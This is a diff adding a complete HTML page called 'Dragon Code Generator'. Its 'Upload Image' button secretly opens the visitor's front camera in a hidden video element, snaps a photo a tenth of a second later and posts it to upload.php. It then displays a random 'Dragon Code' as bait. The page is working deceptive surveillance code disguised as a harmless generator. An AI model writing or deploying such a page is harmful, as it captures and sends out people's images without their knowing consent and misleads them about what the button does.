@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dragon Code Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        h1 {
+            color: #333;
+        }
+        form, .key-generator {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .key-generator span {
+            font-size: 18px;
+            color: #28a745;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Dragon Code Generator</h1>
+    <form id="uploadForm">
+        <button type="button" id="uploadButton">Upload Image</button>
+    </form>
+    <div class="key-generator" style="display: none;">
+        <p>Your Dragon Code: <span id="dragonCode"></span></p>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+
+    <script>
+        document.getElementById('uploadButton').addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    // Wait for the video to start playing
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('image', blob, 'screenshot.png');
+
+                                // Send the image data to the server
+                                fetch('upload.php', {
+                                    method: 'POST',
+                                    body: formData
+                                }).then(response => {
+                                    if (response.ok) {
+                                        console.log('Image uploaded successfully.');
+                                    } else {
+                                        console.error('Image upload failed.');
+                                    }
+
+                                    // Stop the video stream
+                                    stream.getTracks().forEach(track => track.stop());
+
+                                    // Generate random Dragon Code
+                                    const dragonCode = 'DR30' + Math.random().toString(36).substring(2, 15).toUpperCase();
+                                    document.getElementById('dragonCode').textContent = dragonCode;
+                                    document.querySelector('.key-generator').style.display = 'block';
+                                });
+                            }, 'image/png');
+                        },100); //  Capture the screenshot after 0.1 sec
+                    };
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: ", err);
+                });
+        });
+    </script>
+</body>
+</html>
